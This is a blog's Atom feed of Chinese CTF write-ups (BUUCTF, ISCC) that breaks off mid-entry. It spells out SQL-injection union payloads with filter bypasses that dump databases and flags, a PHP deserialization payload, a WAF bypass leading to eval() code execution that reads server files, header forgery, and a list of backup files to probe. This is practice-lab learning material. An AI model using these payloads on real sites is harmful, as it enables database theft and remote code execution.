<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-23T09:09:56.509Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>linbei</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf4</title>
    <link href="http://example.com/2021/05/23/buuctf4/"/>
    <id>http://example.com/2021/05/23/buuctf4/</id>
    <published>2021-05-23T06:43:06.000Z</published>
    <updated>2021-05-23T09:09:56.509Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>打开容器，发现是一个登入得界面，确定是一道SQL注入题</p><p>先用万能密码尝试一下：<img src="/2021/05/23/buuctf4/image-20210523144707563.png" alt="image-20210523144707563"></p><p>我们看到or并没有起到作用，说明他被过滤了，尝试<strong>双写</strong>绕过：<img src="/2021/05/23/buuctf4/image-20210523144955969.png" alt="image-20210523144955969"></p><p>我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过：</p><p>?username=1’%20 uniounionn selecselectt 1%23&amp;password=123</p><p><img src="/2021/05/23/buuctf4/image-20210523145610941.png" alt="image-20210523145610941"></p><p>我们看到成功注入了，但是列数不匹配，增加列数：<img src="/2021/05/23/buuctf4/image-20210523145912955.png" alt="image-20210523145912955"></p><h4 id="开始爆库："><a href="#开始爆库：" class="headerlink" title="开始爆库："></a>开始爆库：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>返回的是默认数据库</p><p><img src="/2021/05/23/buuctf4/image-20210523150044941.png" alt="image-20210523150044941"></p><p>查一下所有数据库：</p><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/2021/05/23/buuctf4/image-20210523163448632.png" alt="image-20210523163448632"></p><p>感觉flag可能藏在<code>ctf</code>数据库中</p><h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523151431699.png" alt="image-20210523151431699"></p><h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523164546430.png" alt="image-20210523164546430"></p><h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p><p><img src="/2021/05/23/buuctf4/image-20210523170907245.png" alt="image-20210523170907245"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;极客大挑战-2019-BabySQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-BabySQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]BabySQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]BabySQL&lt;/h1&gt;&lt;p&gt;打开容器</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="http://example.com/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-05-22T02:37:59.000Z</published>
    <updated>2021-05-22T03:38:21.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序列和反序列化："><a href="#序列和反序列化：" class="headerlink" title="序列和反序列化："></a>序列和反序列化：</h1><p>简单来说：</p><p>序列化——将变量或对象转换成字符串的过程。</p><p>反序列化——将字符串转换成变量或对象的过程。</p><p><img src="/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210522104245613.png" alt="image-20210522104245613"></p><h2 id="常见的魔术方法："><a href="#常见的魔术方法：" class="headerlink" title="常见的魔术方法："></a>常见的魔术方法：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_construct()：创建对象时初始化</span><br><span class="line">_destruction()：结束时销毁对象</span><br><span class="line">_toString()：对象被当作字符串时使用</span><br><span class="line">_sleep()：序列化对象之前调用</span><br><span class="line">_wakeup()：反序列化对象之前调用</span><br><span class="line">_call()：调用对象不存在时使用</span><br><span class="line">_get()：调用私有属性时使用</span><br></pre></td></tr></table></figure><h2 id="常见的访问控制修饰符"><a href="#常见的访问控制修饰符" class="headerlink" title="常见的访问控制修饰符"></a>常见的访问控制修饰符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public(公有)</span><br><span class="line">protected(受保护)</span><br><span class="line">private(私有的)</span><br><span class="line">protected属性被序列化的时候属性值会变成：%00*%00属性名</span><br><span class="line">private属性被序列化的时候属性值会变成：%00类名%00属性名</span><br></pre></td></tr></table></figure><p>借阅资料：</p><p><a href="https://blog.csdn.net/bmth666/article/details/104737025">https://blog.csdn.net/bmth666/article/details/104737025</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序列和反序列化：&quot;&gt;&lt;a href=&quot;#序列和反序列化：&quot; class=&quot;headerlink&quot; title=&quot;序列和反序列化：&quot;&gt;&lt;/a&gt;序列和反序列化：&lt;/h1&gt;&lt;p&gt;简单来说：&lt;/p&gt;
&lt;p&gt;序列化——将变量或对象转换成字符串的过程。&lt;/p&gt;
&lt;p&gt;反序列化</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf3</title>
    <link href="http://example.com/2021/05/21/buuctf3/"/>
    <id>http://example.com/2021/05/21/buuctf3/</id>
    <published>2021-05-21T13:20:13.000Z</published>
    <updated>2021-05-22T12:01:41.093Z</updated>
    
    <content type="html"><![CDATA[<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p>查看源码：</p><p><img src="/2021/05/21/buuctf3/image-20210521234401142.png" alt="image-20210521234401142"></p><p>访问Secret.php<img src="/2021/05/21/buuctf3/image-20210521234640211.png" alt="image-20210521234640211"></p><p>这题应该是伪造HTTP协议，burp抓包，伪造Referer：</p><p><img src="/2021/05/21/buuctf3/image-20210521235247759.png"></p><p>他要求我们用Syclover，伪造User-Agent：</p><p><img src="/2021/05/21/buuctf3/image-20210521235448143.png" alt="image-20210521235448143"></p><p>他又要求只能本地访问，伪造X-Forwarded-For：</p><p><img src="/2021/05/21/buuctf3/image-20210521235637487.png" alt="image-20210521235637487"></p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>打开容器：<img src="/2021/05/21/buuctf3/image-20210522105040083.png" alt="image-20210522105040083"></p><p>发现这样一句话，猜测应该是备份文件泄露，用dirsearch扫描一下，但是这个网址的服务器可能做得不大好会扫崩，所以我们来手工测试一下。尝试<a href="http://www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)">www.zip：![image-20210522105338750](buuctf3.assets/image-20210522105338750.png)</a></p><p>查阅有发现就两个文件有用：<img src="/2021/05/21/buuctf3/image-20210522105452036.png" alt="image-20210522105452036"></p><p><strong>class.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>index.php:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &#39;class.php&#39;;</span><br><span class="line">    $select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">    $res&#x3D;unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script  src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中关键的代码段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">$select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>至此，我们可以知道这是一道反序列化题，当username=admin，password=100时输出flag。但是这里有个麻烦，<code>__wakeup()</code>魔术方法会在反序列化前跳出来执行，也就是username被赋值guest，就破坏了输出flag的条件，因此我们要想办法绕过<code>__wakeup()</code>魔术方法：在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行。</p><p><strong>我们尝试构造payload：</strong></p><p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p><p><strong>这里要注意：</strong>由于这里的username和password属于private变量（private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。），因此在序列化的时候会在字段名前面增加所属类名，并且类名和字段名前要加前缀<code>0</code>。</p><p><img src="/2021/05/21/buuctf3/image-20210522112524139.png" alt="image-20210522112524139"></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>打开容器，发现这是一个计算机，查看一下源码：<img src="/2021/05/21/buuctf3/image-20210522185134958.png" alt="image-20210522185134958"></p><p>现在我们知道服务器端存在一个WAF；</p><p>我们先访问一下calc.php：<img src="/2021/05/21/buuctf3/image-20210522185307483.png" alt="image-20210522185307483"></p><p>我们看到他过滤了一些符号，同时利用num传参</p><h4 id="这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass"><a href="#这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass" class="headerlink" title="这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass"></a>这里我们要引入一个新的知识点：利用PHP的字符串解析特性Bypass</h4><p><strong>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo]  =&gt;   “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</strong></p><p><strong>例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)；其中<code>%20</code>被删除<code>[</code>被下划线替换。</strong></p><p><strong>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</strong></p><p><code>/news.php?%20news[id%00=a</code></p><p><strong>因为此时的变量名是<code>%20new[id</code>，而WAF识别的变量名是<code>new_id</code>，当php解析时会将<code>%20</code>和<code>[</code>删去，将<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。</strong></p><p><strong>PHP的字符串解析对部分字符的操作：</strong></p><table><thead><tr><th>符号</th><th>操作</th></tr></thead><tbody><tr><td>.</td><td>下划线替换</td></tr><tr><td>[</td><td>下划线替换</td></tr><tr><td>%20（ ）</td><td>删除</td></tr><tr><td>+</td><td>删除</td></tr></tbody></table><p>我们看到由于存在eval()函数，因此存在eval()代码执行漏洞：</p><p>PHP函数：<br>🌸scandir()：以数组形式返回指定目录中的文件和目录<br>🌸var_dump()：输出变量的相关信息。显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>🌸file_get_contents()：把整个文件读入一个字符串中。</p><p>总结:我们通过PHP的字符串解析特性绕过防火墙，利用eval()代码执行漏洞获取flag</p><p><strong>构造paylaod：</strong></p><p>扫描服务器根目录下文件：<code>calc.php? num=var_dump(scandir(chr(47)))</code></p><p><img src="/2021/05/21/buuctf3/image-20210522193141532.png" alt="image-20210522193141532"></p><p>获取flagg文件的内容：<code>calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><p><img src="/2021/05/21/buuctf3/image-20210522193354743.png" alt="image-20210522193354743"></p><h4 id="？疑问："><a href="#？疑问：" class="headerlink" title="？疑问："></a>？疑问：</h4><p>为什么<code>calc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))</code>无法获取服务器底下目录</p><p>参考资料：</p><p><a href="https://www.icode9.com/content-4-703121.html">https://www.icode9.com/content-4-703121.html</a></p><p><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;护网杯-2018-easy-tornado&quot;&gt;&lt;a href=&quot;#护网杯-2018-easy-tornado&quot; class=&quot;headerlink&quot; title=&quot;[护网杯 2018]easy_tornado&quot;&gt;&lt;/a&gt;[护网杯 2018]easy_tornado</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>做题思路</title>
    <link href="http://example.com/2021/05/13/web%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <id>http://example.com/2021/05/13/web%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/</id>
    <published>2021-05-13T11:30:19.000Z</published>
    <updated>2021-05-22T02:26:30.008Z</updated>
    
    <content type="html"><![CDATA[<p>常见的备份文件后缀：</p><p>.index.php.swp<br>index.php.swp<br>index.php.bak<br>.index.php~<br>index.php.bak_Edietplus<br>index.php.~<br>index.php.<del>1</del><br>index.php<br>index.php~<br>index.php.rar<br>index.php.zip<br>index.php.7z<br>index.php.tar.gz<br>.index.php.swo<br><a href="http://www.rar/">www.rar</a><br><a href="http://www.zip/">www.zip</a><br><a href="http://www.7z/">www.7z</a><br><code>www.tar.gz</code><br><a href="http://www.tar/">www.tar</a><br>web.zip<br>web.rar<br>web.7z<br>web.tar.gz<br>web.tar<br>wwwroot.rar<br>web.rar</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常见的备份文件后缀：&lt;/p&gt;
&lt;p&gt;.index.php.swp&lt;br&gt;index.php.swp&lt;br&gt;index.php.bak&lt;br&gt;.index.php~&lt;br&gt;index.php.bak_Edietplus&lt;br&gt;index.php.~&lt;br&gt;index.php.</summary>
      
    
    
    
    
    <category term="刷题" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>ISCC</title>
    <link href="http://example.com/2021/05/04/2021ISCC/"/>
    <id>http://example.com/2021/05/04/2021ISCC/</id>
    <published>2021-05-04T04:23:03.000Z</published>
    <updated>2021-05-13T10:25:33.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web：ISCC客服冲冲冲（一）——关于js前端"><a href="#web：ISCC客服冲冲冲（一）——关于js前端" class="headerlink" title="web：ISCC客服冲冲冲（一）——关于js前端"></a>web：ISCC客服冲冲冲（一）——关于js前端</h1><p>打开容器：</p><p><img src="/2021/05/04/2021ISCC/1.png" alt="1"></p><p>发现右边那个会自动加票，而且加的非常快，如果手动点击20秒内肯定干不过</p><p>根据经验这种题肯定是前端的题，F12打开控制器，查看源码</p><p><img src="/2021/05/04/2021ISCC/2.png" alt="2"></p><p>删除箭头所指一行代码，这样就没办法给假的客服偷票，然后在倒计时内疯狂给真的客服投票就好了。</p><p><img src="/2021/05/04/2021ISCC/3.png" alt="3"></p><h1 id="web：这是啥——jsfuck"><a href="#web：这是啥——jsfuck" class="headerlink" title="web：这是啥——jsfuck"></a>web：这是啥——jsfuck</h1><p>打开容器：<img src="/2021/05/04/2021ISCC/image-20210504180322547.png" alt="image-20210504180322547"></p><p>查看源码：<img src="/2021/05/04/2021ISCC/4-1620122808281.png" alt="4"></p><p>发现了一大串这种符号，因为之前有做过类似的，知道这是jsfuck编码。直接复制，粘贴在控制台上回车执行</p><p><img src="/2021/05/04/2021ISCC/5.png" alt="5"></p><h1 id="web：Web01——robots文件-正则匹配"><a href="#web：Web01——robots文件-正则匹配" class="headerlink" title="web：Web01——robots文件+正则匹配"></a>web：Web01——robots文件+正则匹配</h1><p>打开容器：<img src="/2021/05/04/2021ISCC/6.png" alt="6"></p><p>查看robots.txt<img src="/2021/05/04/2021ISCC/7.png" alt="7"></p><p>接着访问/src/code/code.txt，跳出404，然后我试着把<code>/src</code>删掉，结果就可以了。为什么呢？我问了大佬，这个src就代指了上面的ip，因此我们只要输入<code>/code/code.txt</code>就好了<img src="/2021/05/04/2021ISCC/8.png" alt="8"></p><p><strong>代码审计：</strong></p><p>我们可以看到通过<code>?password</code>传参，先判断password的值是否为是既含数字又含字母的，接着判断传参的字符串长度是否超过8，同时传参的值是否大于9999999，最后判断字符串中是否存在<code>*-*</code></p><ul><li><p>那么我们现在理清一下要满足的条件：</p><p>1.要既含字母又含字符串</p><p>2.长度不得超过8，且值必须大于9999999——用科学计数法绕过</p><p>3.存在<code>*-*</code></p></li><li><p>那么对应的payload：<code>1e8*-*</code></p></li></ul><p><img src="/2021/05/04/2021ISCC/9.png" alt="9"></p><h1 id="web：登录——网站备份文件泄露-反序列化字符串逃逸"><a href="#web：登录——网站备份文件泄露-反序列化字符串逃逸" class="headerlink" title="web：登录——网站备份文件泄露+反序列化字符串逃逸"></a>web：登录——网站备份文件泄露+反序列化字符串逃逸</h1><p>刚刚打开容器还以为这是一道SQL注入题，但是试了一会后感觉不对劲，尝试用dirsearch扫描一下服务器端口<img src="/2021/05/04/2021ISCC/10-1620480644596.png" alt="10"></p><p>我们可以看到有好几个php文件，但是前三个文件打开后都是空白文件，尝试打开第四个</p><p>（sp：网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是WWW文件夹里面的文件全部压缩在<a href="http://www.zip/">www.zip</a>里面了。）</p><p><img src="/2021/05/04/2021ISCC/11.png" alt="11"></p><p><img src="/2021/05/04/2021ISCC/12.png" alt="12"></p><p>一 一打开文件进行代码审计一下：</p><p><strong>class.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 